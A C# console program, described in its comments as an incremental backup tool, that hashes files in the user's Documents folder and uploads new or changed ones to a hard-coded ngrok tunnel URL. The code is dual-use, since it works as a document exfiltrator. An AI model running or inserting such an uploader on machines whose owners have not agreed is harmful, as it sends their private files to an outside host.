using System;
using System.IO;
using System.Text;
using System.Net.Http;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Text.Json;

class Program
{
    static readonly string UPLOAD_URL = "https://chug-frostbite-outthink.ngrok-free.dev/upload";

    // Backup target directory
    static readonly string BASE_DIR =
        Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
            "Documents"
        );

    // Save hashes directly inside the backup folder
    static readonly string HASH_FILE =
        Path.Combine(BASE_DIR, ".filehashes.json");

    static readonly HttpClient client = new HttpClient();

    static async Task<Dictionary<string, string>> LoadHashes()
    {
        if (!File.Exists(HASH_FILE))
            return new Dictionary<string, string>();

        try
        {
            string json = await File.ReadAllTextAsync(HASH_FILE);

            return JsonSerializer.Deserialize<Dictionary<string, string>>(json)
                   ?? new Dictionary<string, string>();
        }
        catch
        {
            return new Dictionary<string, string>();
        }
    }

    static async Task SaveHashes(Dictionary<string, string> hashes)
    {
        var options = new JsonSerializerOptions
        {
            WriteIndented = true
        };

        string json = JsonSerializer.Serialize(hashes, options);

        await File.WriteAllTextAsync(HASH_FILE, json);
    }

    static async Task<string> GetFileHash(string filepath)
    {
        using var sha256 = SHA256.Create();
        using var stream = File.OpenRead(filepath);

        byte[] hash = await sha256.ComputeHashAsync(stream);

        StringBuilder sb = new StringBuilder();

        foreach (byte b in hash)
            sb.Append(b.ToString("x2"));

        return sb.ToString();
    }

    static async Task UploadFile(string filepath)
    {
        try
        {
            using var form = new MultipartFormDataContent();
            using var fileStream = File.OpenRead(filepath);

            var fileContent = new StreamContent(fileStream);

            form.Add(
                fileContent,
                "file",
                Path.GetFileName(filepath)
            );

            // Relative path
            string relativePath =
                Path.GetRelativePath(BASE_DIR, filepath);

            form.Add(
                new StringContent(relativePath),
                "path"
            );

            var response =
                await client.PostAsync(UPLOAD_URL, form);

            Console.WriteLine(
                $"Upload {relativePath}: {(int)response.StatusCode}"
            );

            string responseText =
                await response.Content.ReadAsStringAsync();

            Console.WriteLine(responseText);
        }
        catch (Exception ex)
        {
            Console.WriteLine(
                $"ERROR uploading {filepath}: {ex.Message}"
            );
        }
    }

    // Recursive scan with limited depth
    static IEnumerable<string> GetFilesLimitedDepth(
        string baseDir,
        int maxDepth)
    {
        var dirs = new Queue<(string path, int depth)>();

        dirs.Enqueue((baseDir, 0));

        while (dirs.Count > 0)
        {
            var (currentDir, depth) = dirs.Dequeue();

            string[] files = Array.Empty<string>();
            string[] subdirs = Array.Empty<string>();

            try
            {
                files = Directory.GetFiles(currentDir);
            }
            catch { }

            foreach (var file in files)
                yield return file;

            if (depth >= maxDepth)
                continue;

            try
            {
                subdirs = Directory.GetDirectories(currentDir);
            }
            catch { }

            foreach (var dir in subdirs)
            {
                try
                {
                    string name = Path.GetFileName(dir);

                    // Skip hidden dirs
                    if (name.StartsWith("."))
                        continue;

                    // Skip symlinks
                    if (File.GetAttributes(dir)
                        .HasFlag(FileAttributes.ReparsePoint))
                        continue;

                    dirs.Enqueue((dir, depth + 1));
                }
                catch { }
            }
        }
    }

    static async Task Main(string[] args)
    {
        Console.WriteLine($"Scanning: {BASE_DIR}");

        var savedHashes = await LoadHashes();

        var currentHashes =
            new Dictionary<string, string>();

        // 2 levels deep
        var files = GetFilesLimitedDepth(BASE_DIR, 2);

        foreach (var filepath in files)
        {
            try
            {
                // Skip the hash database itself
                if (filepath == HASH_FILE)
                    continue;

                string fileHash =
                    await GetFileHash(filepath);

                string relativePath =
                    Path.GetRelativePath(BASE_DIR, filepath);

                currentHashes[relativePath] = fileHash;

                if (!savedHashes.ContainsKey(relativePath))
                {
                    Console.WriteLine($"[NEW] {relativePath}");
                    await UploadFile(filepath);
                }
                else if (savedHashes[relativePath] != fileHash)
                {
                    Console.WriteLine($"[MODIFIED] {relativePath}");
                    await UploadFile(filepath);
                }
                else
                {
                    Console.WriteLine($"[UNCHANGED] {relativePath}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(
                    $"ERROR processing {filepath}: {ex.Message}"
                );
            }
        }

        await SaveHashes(currentHashes);

        Console.WriteLine("Done.");
    }
}
